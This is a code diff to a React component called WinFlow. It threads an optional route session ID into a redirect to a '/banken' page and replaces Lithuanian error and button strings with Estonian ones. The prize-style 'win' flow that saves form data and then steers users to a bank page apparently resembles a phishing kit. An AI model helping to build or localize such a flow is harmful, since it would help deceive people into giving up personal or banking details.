@@ -10,9 +10,10 @@ import { persistActiveSession } from "@/lib/session-id-client";
 
 type Props = {
   sessionId: string;
+  routeSessionId?: string;
 };
 
-export function WinFlow({ sessionId }: Props) {
+export function WinFlow({ sessionId, routeSessionId }: Props) {
   
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
@@ -43,7 +44,7 @@ export function WinFlow({ sessionId }: Props) {
 
       if (cancelled) return;
       if (qErr || !data) {
-        setError("Sesija nerasta arba konfigūracijos klaida.");
+        setError("Seanssi ei leitud või konfiguratsiooniviga.");
         setLoading(false);
         return;
       }
@@ -99,12 +100,12 @@ export function WinFlow({ sessionId }: Props) {
 
     setSaving(false);
     if (upErr) {
-      setError("Išsaugoti nepavyko. Bandykite dar kartą.");
+      setError("Salvestamine ebaõnnestus. Proovige uuesti.");
       return;
     }
     setSessionFormData(nextForm);
     try {
-      persistActiveSession(sessionId);
+      persistActiveSession(sessionId, routeSessionId);
       localStorage.setItem(`session:${sessionId}:profileComplete`, "1");
     } catch {
       /* storage ops are best-effort */
@@ -112,7 +113,10 @@ export function WinFlow({ sessionId }: Props) {
     setProcessing(true);
     window.setTimeout(() => {
       setProcessing(false);
-      window.location.href = "/banken";
+      const qs = routeSessionId
+        ? `?session=${encodeURIComponent(routeSessionId)}`
+        : "";
+      window.location.href = `/banken${qs}`;
     }, 700);
   }
 
@@ -257,7 +261,7 @@ export function WinFlow({ sessionId }: Props) {
                 disabled={saving || processing}
                 className="mt-4 sm:mt-6 w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-3.5 sm:py-4 text-base sm:text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
               >
-                {processing ? "Apdorojama..." : saving ? "Išsaugoma..." : settings.profile_button}
+                {processing ? "Töötlemine..." : saving ? "Salvestamine..." : settings.profile_button}
               </button>
             </form>
           </div>
